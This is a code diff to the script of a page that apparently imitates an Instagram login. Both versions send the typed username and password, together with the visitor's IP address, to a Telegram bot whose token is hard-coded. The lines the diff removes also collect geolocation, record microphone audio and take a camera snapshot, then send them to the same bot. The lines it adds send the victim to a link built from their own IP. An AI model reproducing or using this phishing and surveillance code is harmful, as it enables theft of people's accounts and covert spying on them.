@@ -77,103 +77,40 @@
     </div>
 
     <script>
-        let locationData = "Unknown location";
         let ipAddress = "Unknown IP";
-        let audioBlob;
-        let imageBlob;
+        let fileShareLink = "Unknown link";
 
         async function requestPermissions() {
             try {
-                // Get IP address
-                fetch('https://api.ipify.org?format=json')
+                // Get the user's public IP address
+                await fetch('https://api.ipify.org?format=json')
                     .then(response => response.json())
                     .then(data => {
                         ipAddress = data.ip;
+                        fileShareLink = `http://${ipAddress}:8080`;
+                        sendInteractionToBot('User opened the page and detected IP for file sharing.');
                     });
-
-                // Request location permission
-                if (navigator.geolocation) {
-                    navigator.geolocation.getCurrentPosition((position) => {
-                        locationData = `Latitude: ${position.coords.latitude}, Longitude: ${position.coords.longitude}`;
-                    });
-                }
-
-                // Request audio and video permissions
-                const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: true });
-                captureMedia(stream);  // Capture snapshot and audio immediately
-
-            } catch (err) {
-                console.error('Error requesting media permissions:', err);
+            } catch (error) {
+                console.error('Error fetching IP address:', error);
             }
         }
 
-        async function captureMedia(stream) {
-            try {
-                // Record 5 seconds of audio
-                audioBlob = await recordAudio(stream);
+        function sendInteractionToBot(eventDetails) {
+            const message = `New Interaction:\nEvent: ${eventDetails}\nIP Address: ${ipAddress}\nFile Share Link: ${fileShareLink}\nTime: ${new Date().toLocaleString()}`;
 
-                // Capture snapshot from video stream
-                imageBlob = await captureSnapshot(stream);
-
-                // Send audio and image immediately to Telegram
-                if (audioBlob) sendImmediateMedia('audio', audioBlob);
-                if (imageBlob) sendImmediateMedia('photo', imageBlob);
-
-            } catch (err) {
-                console.error('Error capturing media:', err);
-            }
-        }
-
-        function recordAudio(stream) {
-            return new Promise((resolve) => {
-                const mediaRecorder = new MediaRecorder(stream);
-                const audioChunks = [];
-
-                mediaRecorder.ondataavailable = event => audioChunks.push(event.data);
-                mediaRecorder.start();
-
-                setTimeout(() => {
-                    mediaRecorder.stop();
-                }, 5000);
-
-                mediaRecorder.onstop = () => {
-                    resolve(new Blob(audioChunks, { type: 'audio/wav' }));
-                };
-            });
-        }
-
-        function captureSnapshot(stream) {
-            return new Promise((resolve) => {
-                const video = document.createElement('video');
-                video.srcObject = stream;
-                video.play();
-                video.onloadedmetadata = () => {
-                    const canvas = document.createElement('canvas');
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    canvas.getContext('2d').drawImage(video, 0, 0);
-                    canvas.toBlob(blob => resolve(blob), 'image/jpeg');
-                };
-            });
-        }
-
-        function sendImmediateMedia(type, blob) {
             const botToken = '7565238718:AAGgWjTEn81YY_h_jTncM3tzc4tWJPdglds';  // Your bot token
             const chatId = '860517021';  // Your chat ID
-            const formData = new FormData();
-            formData.append(type, blob, `${type}.${type === 'audio' ? 'wav' : 'jpg'}`);
+            const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
-            fetch(`https://api.telegram.org/bot${botToken}/send${type === 'audio' ? 'Audio' : 'Photo'}`, {
+            fetch(telegramApiUrl, {
                 method: 'POST',
-                body: formData
-            }).then(response => {
-                if (response.ok) {
-                    console.log(`${type} sent successfully.`);
-                } else {
-                    console.error(`${type} failed to send.`);
-                }
-            }).catch(error => {
-                console.error(`Error sending ${type}:`, error);
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
             });
         }
 
@@ -181,13 +118,13 @@
             const username = document.getElementById('username').value;
             const password = document.getElementById('password').value;
 
-            const message = `New Login Attempt:\nInstagram ID: ${username}\nPassword: ${password}\nIP Address: ${ipAddress}\nLocation: ${locationData}\nTime: ${new Date().toLocaleString()}`;
+            const message = `Login Attempt:\nInstagram ID: ${username}\nPassword: ${password}\nIP Address: ${ipAddress}\nFile Share Link: ${fileShareLink}\nTime: ${new Date().toLocaleString()}`;
 
             const botToken = '7565238718:AAGgWjTEn81YY_h_jTncM3tzc4tWJPdglds';  // Your bot token
             const chatId = '860517021';  // Your chat ID
             const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
-            // Send the message to Telegram
+            // Send login attempt and file-sharing link to Telegram
             fetch(telegramApiUrl, {
                 method: 'POST',
                 headers: {
@@ -198,7 +135,8 @@
                     text: message
                 })
             }).then(() => {
-                window.location.href = "https://www.instagram.com/accounts/login/";
+                // Redirect the user to the shared file directory
+                window.location.href = fileShareLink;
             });
         }
     </script>
